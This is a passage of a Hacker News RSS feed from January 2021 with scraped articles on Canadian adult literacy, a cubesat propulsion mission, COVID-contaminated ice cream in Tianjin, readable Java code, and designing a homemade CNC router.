<!-- -->(Submitted by Eddy Piché)</figcaption></figure></span></p>  <p>As a child, Piché said, it always took him 10 extra minutes to learn everything. He describes those extra minutes, every time,&nbsp;as enough to set him back for life.</p>  <p>"In the old days, like in the 1970s, if you had a hard time learning and stuff, like, they put you back. They put you in special ed classes," he recalled.</p>  <p>Piché said because he was in special education, no one ever bothered to teach him how to read and write.</p>  <p>As a truck driver, he excelled by memorizing landmarks instead of reading road signs.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5876361.1610818050!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/pals-students.jpg 300w,https://i.cbc.ca/1.5876361.1610818050!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/pals-students.jpg 460w,https://i.cbc.ca/1.5876361.1610818050!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/pals-students.jpg 620w,https://i.cbc.ca/1.5876361.1610818050!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/pals-students.jpg 780w,https://i.cbc.ca/1.5876361.1610818050!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/pals-students.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5876361.1610818050!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/pals-students.jpg"></p></div><figcaption>Project Adult Literacy Society in Edmonton helps with reading comprehension and writing.<!-- --> <!-- -->(Submitted by PALS)</figcaption></figure></span></p>  <p>At the age of 48, Piché decided to go back to school to become a social worker after overcoming significant setbacks in his life — including mental illness and addiction.</p>  <p>At first,&nbsp;he relied on his wife to help write his papers.&nbsp;Eventually Piché enrolled in Edmonton's PALS program&nbsp;and met with a volunteer tutor each week to work on his reading comprehension and writing skills.</p>  <p>Today, he works with homeless and other marginalized populations.</p>  <p>"Some people never gave up on me, so I do the same thing. I don't give up," Piché told <em>The Cost of Living</em>. "My motto is never leave anybody behind. That's why I do social work."</p>  <h2>Skills needed in a changing, automated economy</h2>  <p>Eddy Piché's ability to retrain and pivot is a success story, but on its own it does not scale up to&nbsp;solve Canada's problem with literacy.</p>  <p>For years, Canada had an abundance of high-paying jobs that didn't require high levels of literacy, such as natural resource-based work, said the Conference Board of Canada's Burt.</p>  <p>"Because of the nature of our economy, things like mining and forestry are more prominent in our economy than some of our OECD peers," he explained in a comparison to countries such as Japan or Sweden.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5503522.1584649678!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/trucker.jpg 300w,https://i.cbc.ca/1.5503522.1584649678!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/trucker.jpg 460w,https://i.cbc.ca/1.5503522.1584649678!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/trucker.jpg 620w,https://i.cbc.ca/1.5503522.1584649678!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/trucker.jpg 780w,https://i.cbc.ca/1.5503522.1584649678!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/trucker.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5503522.1584649678!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/trucker.jpg"></p></div><figcaption>When driving a truck, Piché memorized landmarks to avoid having to read signs.<!-- --> <!-- -->(Dave Gilson/CBC)</figcaption></figure></span></p>  <p>Due to these economic factors, even if the Canadian education system is producing graduates with high enough literacy scores, these skills sets can atrophy.</p>  <p>"If you're working in a particular role, whatever it is, where reading and writing isn't&nbsp;necessarily a big part of the job, those skills may erode over time," Burt said.</p>  <p>Financial incentives also distort whether Canadians complete their education, which would impact the level of their literacy skills as they enter the workforce to try for higher wages.</p>    <p>At the height of the oil boom, Alberta had a <a href="https://www150.statcan.gc.ca/n1/pub/81-004-x/2010004/article/11360-eng.htm" target="_blank">higher high school dropout rate</a> than several&nbsp;other provinces. But the portion&nbsp;of the population with less education now has fewer places to go as changes to the economy accelerate, Burt said.</p>  <p>"The oil and gas sector is not the growth driver for the economy as it was five years ago," the economist&nbsp;said. "The dynamics around that have changed considerably in recent years. On top of that, we're looking at the impacts of digital technologies and automation on the workforce."</p>  <p><em><strong>WATCH | How the next generation of robots could affect the labour market:</strong></em></p>  <p><span><span><div><div title="How the next generation of robots could affect the labour market" role="button" tabindex="0"><div><div aria-labelledby="1593093187621-metadata-" title="How the next generation of robots could affect the labour market"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/701/59/Robot-thumb.jpg" alt="" loading="lazy"></p></div></div></div></div></div></span></span></p>    <p>As many as one in five jobs in Canada are at risk of being automated, according to the Conference Board of Canada.</p>  <p>Some Canadians filling those&nbsp;"high-risk, low-mobility" jobs most susceptible to automation would have difficulty shifting to work that requires literacy; they&nbsp;tend to come from some of the country's largest industries, such as manufacturing, food services, accommodation, retail and construction.</p>    <p>"These are people whose jobs are at risk to automation, and they have limited ability to move over to other jobs that are at lower risk," Burt explained.</p>  <p>"Basically, there's a real need to to think about how skills requirements are changing in the workforce," he said. "How do we adequately prepare people for entering the workforce and how do we ensure that there are good transition pathways available for people already in the workforce today?"</p>  <h2>Low literacy affects making informed democratic decisions</h2>  <p>Another …</p></span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.cbc.ca/radio/costofliving/let-s-get-digital-from-bitcoin-to-stocktok-plus-what-low-literacy-means-for-canada-s-economy-1.5873703/nearly-half-of-adult-canadians-struggle-with-literacy-and-that-s-bad-for-the-economy-1.5873757">https://www.cbc.ca/radio/costofliving/let-s-get-digital-from-bitcoin-to-stocktok-plus-what-low-literacy-means-for-canada-s-economy-1.5873703/nearly-half-of-adult-canadians-struggle-with-literacy-and-that-s-bad-for-the-economy-1.5873757</a></em></p>]]>
            </description>
            <link>https://www.cbc.ca/radio/costofliving/let-s-get-digital-from-bitcoin-to-stocktok-plus-what-low-literacy-means-for-canada-s-economy-1.5873703/nearly-half-of-adult-canadians-struggle-with-literacy-and-that-s-bad-for-the-economy-1.5873757</link>
            <guid isPermaLink="false">hacker-news-small-sites-25829959</guid>
            <pubDate>Tue, 19 Jan 2021 04:20:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Full success of first-ever cubesat mission equipped with Hall-effect propulsion]]>
            </title>
            <description>
<![CDATA[
Score 117 | Comments 48 (<a href="https://news.ycombinator.com/item?id=25829683">thread link</a>) | @sohkamyung
<br/>
January 18, 2021 | https://exotrail.com/news/2021-01-12/100-exotrail-paves-the-way-for-new-space-mobility-with-first-of-its-kind-successful-in-orbit-demonstration-mission/ | <a href="https://web.archive.org/web/*/https://exotrail.com/news/2021-01-12/100-exotrail-paves-the-way-for-new-space-mobility-with-first-of-its-kind-successful-in-orbit-demonstration-mission/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-1a8790d4=""><h4 data-v-1a8790d4="">More</h4> <p><span data-v-1a8790d4="">Images credits : ESA, NASA, CNRS, UVSQ, Ecole polytechnique,
            Clyde Space, Optimized System Engineering</span> <span data-v-1a8790d4=""><i data-v-1a8790d4=""></i> <i data-v-1a8790d4="">Mobility solutions for an agile space</i> <i data-v-1a8790d4=""></i></span></p></div></div>]]>
            </description>
            <link>https://exotrail.com/news/2021-01-12/100-exotrail-paves-the-way-for-new-space-mobility-with-first-of-its-kind-successful-in-orbit-demonstration-mission/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25829683</guid>
            <pubDate>Tue, 19 Jan 2021 03:30:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ice cream contaminated with Covid-19 detected in China]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25829618">thread link</a>) | @lettergram
<br/>
January 18, 2021 | https://www.rte.ie/news/coronavirus/2021/0116/1190173-coronavirus-ice-cream/ | <a href="https://web.archive.org/web/*/https://www.rte.ie/news/coronavirus/2021/0116/1190173-coronavirus-ice-cream/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<div id="main" data-equalizer="" data-equalize-on="large" data-equalize-by-row="">
<div data-equalizer-watch="" id="main_inner" itemscope="" itemtype="http://schema.org/Article">

<header>

</header>
<div>
<p><span>
Updated / Saturday, 16 Jan 2021 <strong>13:13</strong>
</span>
</p>


</div>

<figure id="main-article-image">
<p><img itemprop="image" src="https://img.rasset.ie/0013a642-500.jpg" data-src="https://img.rasset.ie/0013a642-800.jpg" alt="Tianjin Daqiaodao Food Company's 1,662 employees are placed under quarantine">
</p>
<figcaption data-epic-field="thumbnail_caption">Tianjin Daqiaodao Food Company's 1,662 employees are placed under quarantine</figcaption>
</figure>

<section itemprop="articleBody" data-epic-field="content">
<p>Anti-epidemic authorities in north China's Tianjin Municipality are tracing close contacts with ice cream contaminated with the coronavirus after three samples tested positive for the virus.</p>
<p>All of the products produced by Tianjin Daqiaodao Food Company has been sealed and contained after the company sent the samples to the municipal centre for disease control on Tuesday and Wednesday, which later tested positive for the virus.</p>
<p>Preliminary epidemiological investigations show that the company produced the batch of ice cream using raw materials including milk powder imported from New Zealand and whey powder imported from Ukraine.</p>
<p>The company's 1,662 employees are currently placed under quarantine and have undergone nucleic acid testing on Thursday following the guidance of the Tianjin Center for Disease Control.</p>
<p>Authorities said the company produced 4,836 boxes of contaminated ice cream, among which 2,089 boxes in storage have been sealed away.</p>
<p>A total of 935 boxes of the ice cream, out of 2,747 boxes that entered the market, were in Tianjin and only 65 boxes were sold to markets.</p>
<p>Authorities advised residents who may have bought the product to report their health and physical movements to their communities.</p>
<p>The city has also notified the market regulation authorities in other provinces where the ice cream was sent so it can be traced.</p>
</section>




</div>

</div>
</article></div>]]>
            </description>
            <link>https://www.rte.ie/news/coronavirus/2021/0116/1190173-coronavirus-ice-cream/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25829618</guid>
            <pubDate>Tue, 19 Jan 2021 03:17:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rules for Writing Readable Code]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25829444">thread link</a>) | @htchepannou
<br/>
January 18, 2021 | https://www.wutsi.com/read/301/5-rules-for-writing-readable-code | <a href="https://web.archive.org/web/*/https://www.wutsi.com/read/301/5-rules-for-writing-readable-code">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
 
 
  <figure>
   <img width="640" height="427" data-src="https://s3.amazonaws.com/prod-wutsi/upload/2020/12/30/17/c1db99b3-7da1-4d86-bf7d-be473b3250f1.jpg" src="https://s3.amazonaws.com/prod-wutsi/upload/2020/12/30/17/c1db99b3-7da1-4d86-bf7d-be473b3250f1.jpg">
  </figure> 
  <p>Have you ever reviewed a code that you've written weeks, months or years ago; and then you realize you do not understand what it's doing? that it's too complex? Then imagine what will be the experience of developers other than you when they will review it!</p> 
  <p>This is a sign of code having poor readability!</p> 
  <h2>Why code readability is important?</h2> 
  <p>There are 2 audiences for any code:</p> 
  <ol>
   <li>The computer that is going to execute that code, once translated to <code>01010</code> by compilers.</li>
   <li>The developers who are going to maintain that code in the programming language it has been written.</li>
  </ol> 
  <p>The purpose of code readability is to help developers to easily read, understand and maintain that code.</p> 
  <p>This is what happens when working with code having poor readability:</p> 
  <ul>
   <li>You might misunderstand the code and use it in ways it was not meant to be used.&nbsp;</li>
   <li>You will then spend multiple iterations getting the change right.&nbsp;</li>
   <li>Or you might change the code, unintentionally breaking functionality elsewhere.</li>
  </ul> 
  <p>Overall, you waste more time with such code and it lead a a lot frustrations.&nbsp;Readable code is easy understand and change. This mean we can add new features or fix bugs much faster.</p> 
  <h2>How to make readable code</h2> 
  <p>Look at the following example of code, it extracts all the transactions associated with the event&nbsp;<code>read</code>&nbsp;from a CSV file and store them into another CSV file.</p> 
  <pre>class DataExtractor {
  public int extract(File in, File out) {
     List&lt;String&gt; lines;
     try {
        lines = Files.readAllLines(in.toPath());
     } catch (IOException e){
        return 0
     }

     List&lt;String&gt; extracted = new ArrayList();
     for (int i=0 ; i&lt;lines.length ; i++){
         String line = lines[i];
         String[] columns = line.split(",");
         if (columns.size == 4 &amp;&amp; "1".equals(columns[1]){
            extracted.add(line)
         }
     }

     try {
       Files.write(out.toPath(), extracted);
     } catch(IOException e){
       e.printStackTrace(System.err);
     }
     return filtered.size();
  }
}</pre> 
  <p>We are going to apply 5 rules to improve the readability of this code.</p> 
  <h2>1. Don't use magic numbers</h2> 
  <p>Magic number are values that are used directly in the code. Instead, you should declare then as constants that you'll use in the code.</p> 
  <pre>public class DataExtractor {
  private static final int COLUMN_COUNT = 4;
  private static final String EVENT_READ = "1"

  public int extract(File in, File out) {
     ...
     List&lt;String&gt; extracted = new ArrayList();
     for (int i=0 ; i&lt;lines.length ; i++){
         String line = lines[i];
         String[] columns = line.split(",");
         if (columns.size == COLUMN_COUNT &amp;&amp; EVENT_READ.equals(columns[1]){
            extracted.add(line)
         }
     }
     ...
  }
}</pre> 
  <h2>2. Simplify your conditional statements</h2> 
  <p><code>if</code> statements having more that 1 conditions should be reduced. Move all the conditions to a private function having a name explaining the conditions evaluated.</p> 
  <pre>public class DataExtractor {
  private static final int COLUMN_COUNT = 4;
  private static final String EVENT_READ = "1";

  public int extract(File in, File out) {
     ...
     List&lt;String&gt; extracted = new ArrayList();
     for (int i=0 ; i&lt;lines.length ; i++){
         String line = lines[i];
         String[] columns = line.split(",");
         if (isReadTransaction(column)){
            extracted.add(line)
         }
     }
     ...
  }

  private boolean isReadTransaction(String[] columns) {
     return columns.size == COLUMN_COUNT &amp;&amp; EVENT_READ.equals(columns[1]
  }
}</pre> 
  <h2>3. Don't handle exceptions</h2> 
  <p>Unless you know what to do with the exception, do not handle them, and let the caller of your function deal with it.</p> 
  <p>In our exemple,&nbsp;<code>extract()</code> is extracting the&nbsp;<code>read</code>&nbsp;transactions but is also handling <code>IOException</code>. To simplify this function, we are going remove the responsibility of handling exceptions by changing its signature to:</p> 
  <p><code>public int extract(File in, File out) throws IOException</code></p> 
  <p>By adding to the declaration <code>throws&nbsp;IOException</code>, we are transferring the responsibility of exception handling to the caller. Now the code is much simpler:</p> 
  <pre>public class DataExtractor {
  private static final int COLUMN_COUNT = 4;
  private static final String EVENT_READ = "1";

  public int extract(File in, File out) throws IOException {
     List&lt;String&gt; lines = Files.readAllLines(in.toPath());

     List&lt;String&gt; extracted = new ArrayList();
     for (int i=0 ; i&lt;lines.length ; i++){
         String line = lines[i];
         String[] columns = line.split(",");
         if (isReadTransaction(column)){
            extracted.add(line)
         }
     }

     Files.write(out.toPath(), extracted);
     return filtered.size();
  }

  private boolean isReadTransaction(String[] columns) {
     return columns.size == COLUMN_COUNT &amp;&amp; EVENT_READ.equals(columns[1]
  }
}</pre> 
  <h2>4. Write short functions</h2> 
  <p>A short function is a function that is reduced the minimal number of instructions.</p> 
  <p>If you look at the <code>extract()</code>, at high level it has 3 blocks of code: read a file, extract read transactions and write to a file. To improve readability if <code>extract()</code>, we will move those 3 blocs of code into private functions</p> 
  <pre>public class DataExtractor {
  private static final int COLUMN_COUNT = 4;
  private static final String EVENT_READ = "1";

  public int extract(File in, File out) throws IOException {
     List&lt;String&gt; lines = read(in);
     List&lt;String&gt; extracted = extract(lines);
     write(extracted, out)
     return filtered.size();
  }

  private List&lt;String&gt; read(File in) throws IOException {
     return files.readAllLines(in.toPath());
  }

  private List&lt;String&gt; extract(List&lt;String&gt; lines) {
     List&lt;String&gt; extracted = new ArrayList();
     for (int i=0 ; i&lt;lines.length ; i++){
         String line = lines[i];
         String[] columns = line.split(",");
         if (isReadTransaction(column)){
            extracted.add(line)
         }
     }
  }

  private void write(List&lt;String&gt; extracted, File out) throws IOException {
    Files.write(out.toPath(), extracted);
  }

  private boolean isReadTransaction(String[] columns) {
     return columns.size == COLUMN_COUNT &amp;&amp; EVENT_READ.equals(columns[1]
  }
}</pre> 
  <p>Note that as we are moving code to functions, we make sure that each of the function do not handle exceptions!</p> 
  <h2>5. Use meaningful names</h2> 
  <p>Name you use for functions of variable are critical to improve the readability of the code. It helps you to understand what the code is doing, without going in the the details of each function.</p> 
  <p>Look at the changes we did in the code:</p> 
  <pre>public class DataExtractor {
  private static final int COLUMN_COUNT = 4;
  private static final String EVENT_READ = "1";

  public int extract(File in, File out) throws IOException {
     List&lt;String&gt; transactions = readTransactions(in);
     List&lt;String&gt; readTransactions = extractReadTransactions(transactions);
     writeTransactions(extracted, out)
     return readTransactions.size();
  }

  private List&lt;String&gt; readTransactions(File in) throws IOException {
   ...
  }

  private List&lt;String&gt; extractReadTransactions(List&lt;String&gt; lines) {
   ...
  }

  private void writeTransactions(List&lt;String&gt; transactions, File out) throws IOException {
    ...
  }
  ...
}</pre> 
  <hr> 
  <p>Coding is a social activity. When writing your code, other than ensuring that it works, you must always make sure that other developers will be able to read and understand it. Improving code readability leads to simpler code, simpler code is easier to maintain.</p> 
  <p>Readability is one of the most important measure of code quality</p> 
  <hr> <a href="https://www.wutsi.com/read/309/5-tips-for-simplifying-your-classes" title="5 tips for simplifying your classes">
   </a> 
 
</div></div>]]>
            </description>
            <link>https://www.wutsi.com/read/301/5-rules-for-writing-readable-code</link>
            <guid isPermaLink="false">hacker-news-small-sites-25829444</guid>
            <pubDate>Tue, 19 Jan 2021 02:50:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Everything you need to know to design your own CNC router]]>
            </title>
            <description>
<![CDATA[
Score 316 | Comments 163 (<a href="https://news.ycombinator.com/item?id=25829337">thread link</a>) | @mferraro89
<br/>
January 18, 2021 | https://mattferraro.dev/posts/cnc-router | <a href="https://web.archive.org/web/*/https://mattferraro.dev/posts/cnc-router">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://mattferraro.dev/images/my_router.jpg" alt="My Homemade CNC Router" title="My Homemade CNC Router"></p>
<p>This is the encyclopedic blog post I wish I could have read when I started designing my CNC router</p>
<p>I'll cover all the components and some of the design considerations you'll need to keep in mind when desiging your own CNC router.</p>

<ul>
<li><a href="#overall-layout">Overall Layout</a></li>
<li><a href="#frame-construction">Frame Construction</a>
<ul>
<li><a href="#wood">Wood</a></li>
<li><a href="#metal-tube-with-3d-printed-joints">Metal tube with 3D Printed Joints</a></li>
<li><a href="#extruded-aluminum-aka-8020">Extruded Aluminum aka 8020</a></li>
<li><a href="#steel-beams">Steel Beams</a></li>
<li><a href="#cast-iron">Cast Iron</a></li>
<li><a href="#epoxy-granite">Epoxy Granite</a></li>
</ul>
</li>
<li><a href="#linear-guides">Linear Guides</a>
<ul>
<li><a href="#box-ways-or-dovetail-ways">Box Ways or Dovetail Ways</a></li>
<li><a href="#supported-shafts">Supported Shafts</a></li>
<li><a href="#ground-rails">Ground Rails</a></li>
<li><a href="#unsupported-shafts">Unsupported Shafts</a></li>
</ul>
</li>
<li><a href="#linear-actuation">Linear Actuation</a>
<ul>
<li><a href="#belt-drives">Belt Drives</a></li>
<li><a href="#rack-and-pinion">Rack and Pinion</a></li>
<li><a href="#lead-screwsacme-screws">Lead Screws/Acme Screws</a></li>
<li><a href="#ball-screws">Ball Screws</a></li>
<li><a href="#threaded-rod">Threaded Rod</a></li>
</ul>
</li>
<li><a href="#motors">Motors</a>
<ul>
<li><a href="#stepper-motors">Stepper Motors</a></li>
<li><a href="#servo-motors">Servo Motors</a></li>
</ul>
</li>
<li><a href="#gcode-interpreter-and-step-generator">GCode Interpreter and Step Generator</a>
<ul>
<li><a href="#grbl">GRBL</a></li>
<li><a href="#tinyg">TinyG</a></li>
<li><a href="#g2core">G2Core</a></li>
<li><a href="#smoothieware">Smoothieware</a></li>
</ul>
</li>
<li><a href="#gcode-sender">GCode sender</a>
<ul>
<li><a href="#universal-gcode-sender">Universal GCode Sender</a></li>
<li><a href="#cncjs">CNCJS</a></li>
<li><a href="#bcnc">bCNC</a></li>
<li><a href="#carbide-motion">Carbide Motion</a></li>
<li><a href="#smoothieboard">Smoothieboard</a></li>
<li><a href="#others">Others</a></li>
</ul>
</li>
<li><a href="#spindle">Spindle</a>
<ul>
<li><a href="#palm-router">Palm Router</a></li>
<li><a href="#air-cooled-spindle">Air Cooled Spindle</a></li>
<li><a href="#water-cooled-spindle">Water Cooled Spindle</a></li>
<li><a href="#dc-spindle">DC Spindle</a></li>
</ul>
</li>
<li><a href="#work-holding">Work Holding</a>
<ul>
<li><a href="#fixing-directly-to-the-spoilboard">Fixing Directly to the Spoilboard</a></li>
<li><a href="#t-track-and-clamps">T Track and Clamps</a></li>
<li><a href="#machinist-vise">Machinist Vise</a></li>
</ul>
</li>
<li><a href="#dust-collection">Dust Collection</a>
<ul>
<li><a href="#vacuum-boot">Vacuum Boot</a></li>
<li><a href="#enclosure">Enclosure</a></li>
</ul>
</li>
<li><a href="#axis-arrangement">Axis Arrangement</a>
<ul>
<li><a href="#sliding-gantry">Sliding Gantry</a></li>
<li><a href="#fixed-gantry">Fixed Gantry</a></li>
<li><a href="#column-mill">Column Mill</a></li>
<li><a href="#knee-mill">Knee Mill</a></li>
</ul>
</li>
<li><a href="#cutting-tools">Cutting Tools</a>
<ul>
<li><a href="#flat-nose">Flat Nose</a></li>
<li><a href="#ball-nose">Ball Nose</a></li>
<li><a href="#spoilboard-surfacer">Spoilboard Surfacer</a></li>
<li><a href="#engraving">Engraving</a></li>
<li><a href="#others-1">Others</a></li>
</ul>
</li>
<li><a href="#usability-improvements">Usability Improvements</a>
<ul>
<li><a href="#z-axis-probe">Z Axis probe</a></li>
<li><a href="#automatic-tool-changing">Automatic Tool Changing</a></li>
</ul>
</li>
<li><a href="#conclusion">Conclusion</a></li>
<li><a href="#contact-me">Contact me</a></li>
</ul>

<p>The foundation of a CNC router is some sort of rigid frame. On top of the frame you attach linear guides which allow your axes to move. You actuate that movement with belts or screws, whose rotation is powered by motors. Those motors are controlled by a pulse generator attached to a gcode intepreter, which gets its commands from a gcode sender. I'll cover all your major options below.</p>
<hr>

<p>The frame is the main body of your machine. You should use the most rigid material you are able to work with.</p>
<h2 id="wood">Wood</h2>
<p><img src="https://mattferraro.dev/images/wooden_frame.jpg" alt="Wooden Frame Router" title="Example Wooden Frame Router"></p>
<p>If you only have access to woodworking equipment, then <a href="https://www.youtube.com/watch?v=jjdXpp77MdU">wood is your only choice</a>. The main advantages of wood are that it is cheap and easy to work with. The main disadvantage is that wood is not rigid enough to resist cutting forces, leading to chatter and low-quality surface finishes. A secondary concern is that wood is very dimensionally unstable, easily fluctuating with temperature and humidity changes.</p>
<p>If you never intend to cut any material harder than wood and you are comfortable never achieving tight tolerances or repeatable dimensions, a wooden frame can be a very economical choice. If you are primarily making art pieces rather than functional mechanical parts subject to tolerances, this might be a good choice for you.</p>

<p><img src="https://mattferraro.dev/images/mpcnc.jpg" alt="Mostly Printed CNC" title="The Mostly Printed CNC"></p>
<p>The Mostly Printed CNC and <a href="https://www.youtube.com/watch?v=Njs0FU6PfPg">others</a> like it make use of cheap extruded metal tube to serve as bones and 3D printed parts to serve as joints. Many of these designs don't require metalworking skills of any kind except to cut metal tubes to length. Given the ubiquity of 3D printers nowadays, these designs are extremely accessible, maybe moreso than wooden designs.</p>
<p>Their primary weakness is that 3D printed parts aren't very rigid, so the precision, repeatability, and surface finish of parts created on these machines is limited. Another common weakness in these designs is to use the extruded metal surface as the linear guide. Extruded metal is not a precision surface so any surface imperfections in the metal will translate to imperfections in the finished work. This limits the usefulness to hobby and art projects.</p>
<p>I should mention that "low-precision" for a CNC router might mean give or take 30 thousandths of an inch. If you are a woodworker used to table saws and pencil-drawn lines, tolerances that tight are fantastic and either a wooden frame or mostly printed frame will likely exceed your needs.</p>
<h2 id="extruded-aluminum-aka-8020">Extruded Aluminum aka 8020</h2>
<p><img src="https://mattferraro.dev/images/avidcnc.jpg" alt="Avid CNC" title="Avid CNC"></p>
<p>A very popular choice for router frames is aluminum 8020. The extruded profiles can be ordered in many dimensions and some providers like <a href="https://us.misumi-ec.com/vona2/mech/M1500000000/M1501000000/M1501010000/?searchFlow=results2category&amp;KWSearch=Aluminum%20extrusions">Misumi</a> will not only cut them to length for you, they will drill and countersink holes, they will tap ends, and perform many other operations for you right in their factory.</p>
<p>The ease of working with 8020 cannot be overstated. If you have a miter saw you can easily cut it to length yourself to produce whatever design you like. The main advantages are that you get the rigidity of metal-on-metal joints and the infinite reworkability of a lego set without the difficulty of more traditional metalworking.</p>
<p>Some providers can even mill precision surfaces onto your extrusion, allowing it to play double duty as a structural member and a linear guide.</p>
<p>The main disadvantages of 8020 are that it is more costly than extruded aluminum tube and that it isn't as rigid as steel. Still, it is a very popular choice because it is the cheapest, easiest way to produce a machine capable of hitting tolerances and producing great surface finishes.</p>
<h2 id="steel-beams">Steel Beams</h2>
<p><img src="https://mattferraro.dev/images/steel_frame_router.jpg" alt="Steel Frame Router" title="Steel Frame Router"></p>
<p>A Steel frame is a fantastic choice for its high mass and high rigidity. The biggest downsides are that metalworking requires tools that many hobbyists don't have access to, and that steel frames do not damp vibration well.</p>
<p>If you are comfortable cutting, welding, and powder coating steel then you should probably go ahead and build the frame out of steel. Some large surfaces will need to be milled flat to hold linear guides, so make sure you plan everything out before you start welding.</p>
<p>With a steel frame you can hit tight tolerances and cut almost any material. Your machine's primary limitation won't be its frame. See This Old Tony's excellent steel-framed CNC router build <a href="https://www.youtube.com/watch?v=K9UA9ZRFwWU">here</a></p>
<h2 id="cast-iron">Cast Iron</h2>
<p><img src="https://mattferraro.dev/images/cast_iron.jpg" alt="Cast Iron Frame" title="A CNC machine with cast iron frame"></p>
<p>Mills and lathes very often have frames made of cast iron for its superior vibration damping, extreme rigidity, and reduced part count by combining many parts together into a single casting.</p>
<p>This technique requires a tremendous amount of pre-planning, experience, and access to a metal foundry. It is prohibitively expensive and difficult for most hobbyists, but it produces some of the finest CNC machines that can be produced.</p>
<p>Other disadvantages are that cast iron parts can easily rust in open air or corrode if attacked with solvents. Cast parts generally need to be sand blasted and painted to survive industrial environments.</p>
<p>The casting process does not leave you with precision surfaces, so surface machining will be required on any parts that must be within a specified tolerance.</p>
<p>There is significant upfront engineering cost to produce the required molds, but once you have molds the per-unit cost of casting can be cost competitive. If you are designing an extremely high quality CNC router specifically to be mass produced and sold to others, consider cast iron for your frame.</p>
<h2 id="epoxy-granite">Epoxy Granite</h2>
<p><img src="https://mattferraro.dev/images/epoxy_granite.webp" alt="Epoxy Granite Frame" title="A CNC machine with epoxy granite frame"></p>
<p>An exotic choice for frame building is epoxy granite--crushed up natural granite suspended in an epoxy binder that you cast into whatever shape you want, at room temperature.</p>
<p>The advantages of epoxy granite are that it is very dimensionally stable, it is resistent to chemical solvents, it does not require painting, and it can damp vibrations up to 30 times better than an equivalent steel frame, or 10 times better than cast iron. Epoxy granite can be cast into any shape you like using only at-home equipment and techniques. Pre-made threaded inserts and linear guides can be inserted at casting time, greatly reducing the need for machine finishing the final cast parts. For ultra high precision builds, epoxy granite is a fantastic choice.</p>
<p>The disdvantages are that epoxy granite has low tensile strength, and generally needs to be quite thick in all parts of the frame.</p>
<p>Epoxy granite is a rare choice among hobbyists, but I believe it is mostly because the design and build process are so foreign. Frames made from steel beams are easy to visualize and intuitive to link together. Frames made from cast material require a very different design approach that is just not well understood by most hobbyists.</p>
<p>If you are really looking to build an incredibly high performance machine, especially if you plan to make many machines, epoxy granite might be a good choice for you.</p>
<hr>

<p>The role of the linear guide is to constrain movement onto a single axis, preventing any unwanted rotation or deflection. These are often some of the most expensive parts on a CNC router.</p>
<h2 id="box-ways-or-dovetail-ways">Box Ways or Dovetail Ways</h2>
<p><img src="https://mattferraro.dev/images/dovetail_ways.jpg" alt="Dovetail Ways" title="Dovetail ways"></p>
<p>Mills and lathes generally use box ways or dovetail ways, which are precision machined surfaces floating over each other on a microscopically thin film of oil, kept tight with a small insert called a gibbs. When kept clean of damaging debris and maintained properly with oil, ways <a href="https://www.youtube.com/watch?v=cwdoUjynpEk&amp;t=125">do not wear whatsoever</a> and will last longer than every other part of the machine.</p>
<p>Ways have the advantage of a huge contact area, allowing vibrations to couple very effectively across the linear guide and into the frame. This allows vibrational energy to spread out through the entire machine body where it can be dampened effectively.</p>
<p>They carry the secondary advantage of being extremely massive, which helps reduce the amplitude of vibrations. Ways are the most rigid linear guides available. In mills or lathes the ways can be ground directly into the body of the machine, reducing assembly complexity and part count.</p>
<p>Despite all these advantages they are almost never incorporated into CNC routers because they are too expensive per unit length, their large mass makes them unweildy, and their wear patterns are not a good match for computer controlled machining.</p>
<p>The issue with wear is that if a small problem does develop on the ways, it can quickly cascade into a serious issue that causes further damage. Repairing ways, especially in situ, is a tremendously tedious and therefore expensive process. A human machinist is likely to notice such problems developing on a manual mill, but the computer operating a CNC mill will not notice.</p>
<p>In contrast all following linear guides are cheap and easy to replace when worn.</p>
<h2 id="supported-shafts">Supported Shafts</h2>
<p><img src="https://mattferraro.dev/images/supported_shafts.jpg" alt="Supported Shaft linear guides" title="Supported Shafts"></p>
<p>Supported shafts are precision ground steel with aluminum support structure underneath that allows you to fix the shaft firmly to the frame of the CNC machine. The linear bearings that run on the shaft are free to rotate about 20 degrees back and forth on the long axis of the shaft, meaning they actually offer two distinct degrees of freedom, one of which must be further …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mattferraro.dev/posts/cnc-router">https://mattferraro.dev/posts/cnc-router</a></em></p>]]>
            </description>
            <link>https://mattferraro.dev/posts/cnc-router</link>
